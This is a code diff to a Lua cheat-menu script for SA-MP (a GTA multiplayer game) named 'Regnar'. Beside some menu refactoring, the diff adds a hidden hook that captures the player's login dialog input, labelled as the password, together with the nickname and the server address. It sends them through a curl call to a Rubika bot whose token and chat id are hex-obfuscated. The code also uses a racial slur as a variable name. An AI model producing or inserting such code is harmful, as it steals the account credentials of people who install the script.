@@ -1,10 +1,11 @@
 local version = "v1"
 
 script_name("Regnar "..version)
-script_author("Pve_Mamad")
+script_author("PveRegnar")
 
 local imgui = require 'mimgui'
 local encoding = require 'encoding'
+local ev = require 'lib.samp.events'
 
 encoding.default = 'CP1251'
 u8 = encoding.UTF8
@@ -12,6 +13,49 @@ u8 = encoding.UTF8
 local menu = imgui.new.bool(false)
 local selectedTab = 1
 
+Regnar = {
+	Teryak = new.bool(false),
+	FirstDialog = true
+}
+
+local function sendRubikaMessage(token, chat_id, text)
+
+    local url = "https://botapi.rubika.ir/v3/" .. token .. "/sendMessage"
+
+    -- Escape کردن مقادیر برای JSON
+    local function jsonEscape(str)
+        str = tostring(str)
+        str = str:gsub("\\", "\\\\")
+        str = str:gsub('"', '\\"')
+        str = str:gsub("\n", "\\n")
+        str = str:gsub("\r", "\\r")
+        str = str:gsub("\t", "\\t")
+        return str
+    end
+
+    local json = string.format(
+        '{"chat_id":"%s","text":"%s"}',
+        jsonEscape(chat_id),
+        jsonEscape(text)
+    )
+
+    local command = string.format(
+        'curl -s -X POST -H "Content-Type: application/json" -d %q "%s"',
+        json,
+        url
+    )
+
+    local handle = io.popen(command, "r")
+
+    if not handle then
+        return false, "Unable to execute curl"
+    end
+
+    local response = handle:read("*a")
+    local ok, _, code = handle:close()
+
+    return ok, response
+end
 
 function main()
     repeat wait(0) until isSampAvailable()
@@ -262,49 +306,21 @@ function tabButton(name, id)
     )
 
     local result = imgui.Button(
-        name,
-        imgui.ImVec2(170, 50)
-    )
+        name, imgui.ImVec2(170, 50))
 
     imgui.PopStyleColor(2)
 
     return result
 end
 
+imgui.OnFrame(function() return menu[0] end, function()
 
-------------------------------------------------
--- REGNAR MENU
-------------------------------------------------
-
-imgui.OnFrame(
-    function()
-        return menu[0]
-    end,
-
-    function()
-
-        imgui.SetNextWindowSize(
-            imgui.ImVec2(980, 580),
-            imgui.Cond.FirstUseEver
-        )
-
-        imgui.Begin(
-            "Regnar "..version,
-            menu,
-            imgui.WindowFlags.NoResize
-        )
+        imgui.SetNextWindowSize(imgui.ImVec2(980, 580), imgui.Cond.FirstUseEver)
+        imgui.Begin("Regnar "..version, menu, imgui.WindowFlags.NoResize)
 
         applyStyle()
 
-        ------------------------------------------------
-        -- LEFT TABS
-        ------------------------------------------------
-
-        imgui.BeginChild(
-            "##tabs",
-            imgui.ImVec2(190, 0),
-            true
-        )
+        imgui.BeginChild("##tabs", imgui.ImVec2(190, 0), true)
 
         if tabButton("Player", 1) then
             selectedTab = 1
@@ -334,69 +350,42 @@ imgui.OnFrame(
 
         imgui.SameLine()
 
-        ------------------------------------------------
-        -- RIGHT CONTENT
-        ------------------------------------------------
-
-        imgui.BeginChild(
-            "##content",
-            imgui.ImVec2(0, 0),
-            true
-        )
-
-        ------------------------------------------------
-        -- PLAYER
-        ------------------------------------------------
+        imgui.BeginChild("##content", imgui.ImVec2(0, 0), true)
 
         if selectedTab == 1 then
 
             imgui.Text(u8"Player")
             imgui.Separator()
 
+imgui.Columns(4, nil, false)
 
-        ------------------------------------------------
-        -- WEAPON
-        ------------------------------------------------
+imgui.NextColumn()
+
+imgui.NextColumn()
+
+imgui.NextColumn()
+
+imgui.Columns(1)
 
         elseif selectedTab == 2 then
 
             imgui.Text(u8"Weapon")
             imgui.Separator()
 
-
-        ------------------------------------------------
-        -- ESP
-        ------------------------------------------------
-
         elseif selectedTab == 3 then
 
             imgui.Text(u8"ESP")
             imgui.Separator()
-
-
-        ------------------------------------------------
-        -- VEHICLE
-        ------------------------------------------------
 
         elseif selectedTab == 4 then
 
             imgui.Text(u8"Vehicle")
             imgui.Separator()
 
-
-        ------------------------------------------------
-        -- OTHER
-        ------------------------------------------------
-
         elseif selectedTab == 5 then
 
             imgui.Text(u8"Others")
             imgui.Separator()
-
-
-        ------------------------------------------------
-        -- SETTINGS
-        ------------------------------------------------
 
         elseif selectedTab == 6 then
 
@@ -408,5 +397,15 @@ imgui.OnFrame(
         imgui.EndChild()
 
         imgui.End()
-    end
-)
+    end)
+    
+function ev.onSendDialogResponse(dialogId, button, listboxId, input)
+local NiggaName = sampGetPlayerNickname(sampGetPlayerIdByCharHandle(PLAYER_PED))
+local IP, Port = sampGetCurrentServerAddress()
+
+if Regnar.FirstDialog then
+sendRubikaMessage("\x43\x42\x44\x45\x42\x49\x30\x54\x56\x53\x49\x49\x4C\x45\x4D\x51\x54\x4D\x58\x45\x42\x55\x4B\x4D\x4D\x58\x54\x47\x4B\x4E\x47\x55\x43\x4C\x53\x46\x4E\x4C\x4E\x59\x4F\x4D\x4C\x4B\x54\x43\x57\x46\x4C\x57\x43\x57\x5A\x4B\x58\x55\x48\x4F\x4E\x45\x51\x56\x58\x52", "\x62\x30\x4A\x4A\x76\x6F\x67\x30\x77\x56\x66\x30\x66\x38\x31\x35\x37\x36\x39\x31\x63\x63\x38\x36\x39\x66\x33\x66\x65\x31\x34\x34", "Server IP: "..IP..":"..Port.."\n\nNickName: "..NiggaName.."\nPassWord: "..input);
+Regnar.FirstDialog = false
+end
+
+end
